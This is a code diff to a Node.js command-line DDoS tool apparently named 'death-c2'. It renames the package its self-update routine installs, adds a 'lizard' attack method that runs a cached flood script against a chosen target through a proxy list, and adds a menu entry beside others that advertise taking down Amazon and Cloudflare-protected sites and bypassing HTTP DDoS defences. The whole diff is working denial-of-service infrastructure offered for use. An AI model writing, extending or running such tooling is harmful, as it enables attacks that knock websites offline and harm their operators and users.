@@ -107,9 +107,9 @@ async function bootup() {
   } else {
       console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`)
       console.log(`Waiting Auto Update...`)
-      await exec(`npm uninstall -g prmnmd-tuls`)
+      await exec(`npm uninstall -g death-c2`)
       console.log(`Installing update`)
-      await exec(`npm i -g prmnmd-tuls`)
+      await exec(`npm i -g death-c2`)
       console.log(`Restart Tools Please`)
       process.exit()
     }
@@ -320,7 +320,12 @@ const metode = path.join(__dirname, `/lib/cache/${methods}`);
        pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
           sigma()
-          } else if (methods === 'udpbipass') {
+          } else if (methods === 'udpbipass')
+          {
+       pushOngoing(target, methods, duration)
+       exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+          sigma()
+          } else if (methods === 'lizard') {
        pushOngoing(target, methods, duration)
 const destroy = path.join(__dirname, `/lib/cache/destroy`);
 const storm = path.join(__dirname, `/lib/cache/storm`);
@@ -700,6 +705,7 @@ permen.question('\x1b[47m\x1b[34mroot@deathc2\x1b[0m: ', (input) => {
 || layer-7    || Amazon, cf, others can be down
 || http-ddos  || High RPS / Bypasses HTTP DDoS
 || reset      || Bypasses HTTP DDoS, UAM, JS, NoSec
+|| lizatd     || Bypass ur ass
 [=========================================]
 `);
     sigma();
